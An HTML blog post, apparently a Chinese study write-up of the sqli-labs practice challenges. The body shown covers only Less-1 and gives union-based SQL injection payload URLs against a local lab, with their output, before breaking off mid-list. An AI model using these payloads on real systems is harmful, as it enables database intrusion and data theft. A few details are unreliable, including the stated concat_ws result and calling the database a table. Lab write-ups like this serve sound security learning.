@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="baidu-site-verification" content="5ZQsOe30cm" />
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"southsea.st","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"disqusjs","storage":true,"lazyload":false,"nav":null,"activeClass":"disqusjs"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="Web安全修炼第一周。 原理 SQL注入起因于数据和代码的界限分割不明确。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全SQL修炼计划 基础挑战">
+<meta property="og:url" content="https://southsea.st/Study-SQLI-Basic-Challenges/index.html">
+<meta property="og:site_name" content="南溟NaN">
+<meta property="og:description" content="Web安全修炼第一周。 原理 SQL注入起因于数据和代码的界限分割不明确。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2018-07-18T00:00:00.000Z">
+<meta property="article:modified_time" content="2025-01-24T03:34:53.074Z">
+<meta property="article:author" content="南溟NaN">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web安全修炼计划">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://southsea.st/Study-SQLI-Basic-Challenges/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://southsea.st/Study-SQLI-Basic-Challenges/","path":"Study-SQLI-Basic-Challenges/","title":"Web安全SQL修炼计划 基础挑战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Web安全SQL修炼计划 基础挑战 | 南溟NaN</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">南溟NaN</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">在这浩瀚星河的你是什么</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">24</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">5</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">68</span></a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x00-get%E5%8D%95%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">0x00 GET单查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-1-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84get%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.1.</span> <span class="nav-text">Less-1
+基于错误的GET单引号字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E8%A1%A5%E5%85%85"><span class="nav-number">2.1.1.</span> <span class="nav-text">相关补充</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-2-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84get%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.2.</span> <span class="nav-text">Less-2 基于错误的GET整型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-3-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84get%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.3.</span> <span class="nav-text">Less-3
+基于错误的GET单引号变形字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-4-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84get%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">Less-4
+基于错误的GET双引号变形字符型注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x01-get%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">0x01 GET双查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-5-%E5%9F%BA%E4%BA%8E%E5%8F%8C%E6%9F%A5%E8%AF%A2%E7%9A%84get%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">Less-5
+基于双查询的GET单引号字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E8%A1%A5%E5%85%85"><span class="nav-number">3.2.</span> <span class="nav-text">原理补充</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#x00-%E5%AF%B9%E6%AF%94%E8%AF%AD%E5%8F%A5"><span class="nav-number">3.2.1.</span> <span class="nav-text">0x00 对比语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x01-%E6%B5%8B%E8%AF%95rand0"><span class="nav-number">3.2.2.</span> <span class="nav-text">0x01 测试rand(0)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x02-%E6%B5%8B%E8%AF%95rand"><span class="nav-number">3.2.3.</span> <span class="nav-text">0x02 测试rand()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x03-%E5%A4%9A%E6%95%B0%E6%8D%AE%E6%B5%8B%E8%AF%95"><span class="nav-number">3.2.4.</span> <span class="nav-text">0x03 多数据测试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x04-%E8%99%9A%E6%8B%9F%E8%A1%A8"><span class="nav-number">3.2.5.</span> <span class="nav-text">0x04 虚拟表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x05-rand0%E5%87%BD%E6%95%B0"><span class="nav-number">3.2.6.</span> <span class="nav-text">0x05 rand(0)函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#x06-rand%E5%87%BD%E6%95%B0"><span class="nav-number">3.2.7.</span> <span class="nav-text">0x06 rand()函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-6-%E5%9F%BA%E4%BA%8E%E5%8F%8C%E6%9F%A5%E8%AF%A2%E7%9A%84get%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">3.3.</span> <span class="nav-text">Less-6
+基于双查询的GET双引号字符型注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x02-get%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">0x02 GET导出文件注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-7-%E5%9F%BA%E4%BA%8E%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E7%9A%84get%E6%B3%A8%E5%85%A5"><span class="nav-number">4.1.</span> <span class="nav-text">Less-7 基于导出文件的GET注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E8%A1%A5%E5%85%85-1"><span class="nav-number">4.1.1.</span> <span class="nav-text">相关补充</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#load_file"><span class="nav-number">4.1.1.1.</span> <span class="nav-text">load_file()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#load-data-infile"><span class="nav-number">4.1.1.2.</span> <span class="nav-text">load data infile</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#select-...-into-outfile-file_name"><span class="nav-number">4.1.1.3.</span> <span class="nav-text">select ... into outfile
+&#39;file_name&#39;</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x03-get%E5%8D%95%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.</span> <span class="nav-text">0x03 GET单查询盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-8-%E5%9F%BA%E4%BA%8E%E5%B8%83%E5%B0%94%E7%9A%84get%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.1.</span> <span class="nav-text">Less-8
+基于布尔的GET单引号字符型盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-9-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84get%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.2.</span> <span class="nav-text">Less-9
+基于时间的GET单引号字符型盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-10-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84get%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="nav-number">5.3.</span> <span class="nav-text">Less-10
+基于时间的GET双引号字符型盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x04-post%E5%8D%95%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">0X04 POST单查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-11-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84post%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">6.1.</span> <span class="nav-text">Less-11
+基于错误的POST单引号字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-12-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84post%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">6.2.</span> <span class="nav-text">Less-12
+基于错误的POST双引号变形字符型注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x05-post%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">0X05 POST双查询注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-13-%E5%9F%BA%E4%BA%8E%E5%8F%8C%E6%9F%A5%E8%AF%A2%E7%9A%84post%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">7.1.</span> <span class="nav-text">Less-13
+基于双查询的POST单引号变形字符型注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-14-%E5%9F%BA%E4%BA%8E%E5%8F%8C%E6%9F%A5%E8%AF%A2%E7%9A%84post%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">7.2.</span> <span class="nav-text">Less-14
+基于双查询的POST双引号字符型注入</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x05-post%E5%8D%95%E6%9F%A5%E8%AF%A2%E7%9B%B2%E6%B3%A8"><span class="nav-number">8.</span> <span class="nav-text">0X05 POST单查询盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-15-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84post%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="nav-number">8.1.</span> <span class="nav-text">Less-15
+基于时间的POST单引号字符型盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-16-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84post%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="nav-number">8.2.</span> <span class="nav-text">Less-16
+基于时间的POST双引号变形字符型盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#x06-post%E6%9B%B4%E6%96%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">0x06 POST更新注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#less-17-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84post%E6%9B%B4%E6%96%B0%E6%B3%A8%E5%85%A5"><span class="nav-number">9.1.</span> <span class="nav-text">Less-17
+基于错误的POST更新注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E8%A1%A5%E5%85%85-2"><span class="nav-number">9.1.1.</span> <span class="nav-text">相关补充</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#extractvaluexml_fragxpath_expr"><span class="nav-number">9.1.1.1.</span> <span class="nav-text">extractvalue(xml_frag,xpath_expr)</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#updatexmlxml_targetxpath_exprnew_xml"><span class="nav-number">9.1.1.2.</span> <span class="nav-text">updatexml(xml_target,xpath_expr,new_xml)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-18-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84post-user-agent%E6%B3%A8%E5%85%A5"><span class="nav-number">9.2.</span> <span class="nav-text">Less-18 基于错误的POST
+User-Agent注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E8%A1%A5%E5%85%85-3"><span class="nav-number">9.2.1.</span> <span class="nav-text">相关补充</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#http%E5%A4%B4%E9%83%A8%E8%AF%A6%E8%A7%A3"><span class="nav-number">9.2.1.1.</span> <span class="nav-text">HTTP头部详解</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-19-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84post-referer%E6%B3%A8%E5%85%A5"><span class="nav-number">9.3.</span> <span class="nav-text">Less-19 基于错误的POST
+Referer注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#less-20-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84post-cookie%E6%B3%A8%E5%85%A5"><span class="nav-number">9.4.</span> <span class="nav-text">Less-20 基于错误的POST
+Cookie注入</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="南溟NaN"
+      src="https://avatars.githubusercontent.com/u/34373144?v=4">
+  <p class="site-author-name" itemprop="name">南溟NaN</p>
+  <div class="site-description" itemprop="description">在这浩瀚星河的你是什么</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">68</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/southseast" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;southseast" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:st.southsea@gmail.com" title="E-Mail → mailto:st.southsea@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://southsea.st/Study-SQLI-Basic-Challenges/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/34373144?v=4">
+      <meta itemprop="name" content="南溟NaN">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="南溟NaN">
+      <meta itemprop="description" content="在这浩瀚星河的你是什么">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Web安全SQL修炼计划 基础挑战 | 南溟NaN">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Web安全SQL修炼计划 基础挑战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2018-07-18 00:00:00" itemprop="dateCreated datePublished" datetime="2018-07-18T00:00:00+00:00">2018-07-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><strong>Web</strong>安全修炼第一周。</p>
+<h3 id="原理">原理</h3>
+<p><strong>SQL</strong>注入起因于数据和代码的界限分割不明确。</p>
+<span id="more"></span>
+<h3 id="x00-get单查询注入">0x00 GET单查询注入</h3>
+<h4 id="less-1-基于错误的get单引号字符型注入">Less-1
+基于错误的GET单引号字符型注入</h4>
+<p>尝试写入<strong>?id=1</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=1&#x27;</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan      </span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1 </span><br></pre></td></tr></table></figure>
+<p><strong>limit
+0,1</strong>表示从表中的第<strong>0</strong>个数据开始，只读取<strong>1</strong>个。</p>
+<p>因为单引号未闭合导致<strong>sql</strong>语法报错，可以得出未过滤单引号的结论，则这时需要在注入的语句最后加上<strong>%23</strong>【<strong>#</strong>的<strong>url</strong>编码或是<strong>--+</strong>来闭合原构造语句末尾的分号。</p>
+<p>接下来注出字段名，<strong>order
+by</strong>函数是用来按照字段名排序查询，此处可以使用<strong>1</strong>、<strong>2</strong>、<strong>3</strong>等来按照字段名的序号查询，从而测试该表的字段数，若不存在该字段序号则会返回错误。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=1&#x27;order by 4 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+<p><strong>Unknown column '4' in 'order
+clause'</strong>表示在按照第四列字段排序的时候出错，则不存在第<strong>4</strong>个字段，那么该表共有<strong>3</strong>个字段。</p>
+<p>使用<strong>union</strong>联合查询来同时查询多个语句，使用<strong>union</strong>联合查询时，前后两个语句查询返回的结果集需要有着相同列数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=1&#x27;  union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+<p>这里没有结果的原因是<strong>mysql_fetch_arra()</strong>函数只被调用了一次
+，并没有将结果循环输出
+，而<strong>mysql_fetch_arra()</strong>的作用是从结果集中取第一行作为关联数组或数字数组或二者兼有。</p>
+<p>因此需要使第一行查询的结果是空，则它就会获取<strong>union</strong>联合查询后的结果渲染在网页上了。故使得<strong>id=-1</strong>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27;  union select 1,2,3 --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3 </span><br></pre></td></tr></table></figure>
+<p><strong>concat(str1,str2,…)</strong>函数会拼接多个字符串，中间无分隔符，而<strong>concat_ws(separator,str1,str2,…)</strong>函数是将<strong>separator</strong>作为分隔符来拼接的多个字符串。例如<strong>select concat('1','2','3');</strong>返回的值是<strong>123</strong>，而<strong>select concat_ws('-','1','2','3');</strong>返回的值是<strong>1,2,3</strong>。</p>
+<p><strong>user()</strong>函数返回当前链接的用户名，<strong>database()</strong>函数返回当前链接使用的数据库名。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-1/?id=-1&#x27;  union select 1,2,concat_ws(char(32,32),user(),database()) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:root@localhost security</span><br></pre></td></tr></table></figure>
+<p>那么现在得到了一个重要的信息，即当前的表名为<strong>security</strong>。</p>
+<h5 id="相关补充">相关补充</h5>
+<p>补一下<strong>mysql</strong>的相关知识。</p>
+<p><strong>mysql</strong>中的<strong>information_scherma</strong>从字面上来说是信息计划表，像是一个索引，又或者说这是一个目录，在这里面保存着关于<strong>mysql</strong>其他数据库的库名、表名、字段名、字段类型等等信息。</p>
+<ul>
+<li><p><strong>schemata</strong>表：提供了当前<strong>mysql</strong>实例中所有数据库的信息。命令<strong>show
+databases;</strong>的结果取之此表。</p></li>
+<li><p><strong>tables</strong>表：提供了关于数据库中的表的信息【包括视图。详细表述了某个表属于哪个<strong>schema</strong>，表类型，表引擎，创建时间等信息。命令<strong>show
+tables from schemaname;</strong>的结果取之此表。</p></li>
+<li><p><strong>columns</strong>表：提供了表中的列信息。命令<strong>show
+columns from schemaname.tablename;</strong>的结果取之此表。</p></li>
+<li><p><strong>statistics</strong>表：提供了关于表索引的信息。命令<strong>show
+index from schemaname.tablename;</strong>的结果取之此表。</p></li>
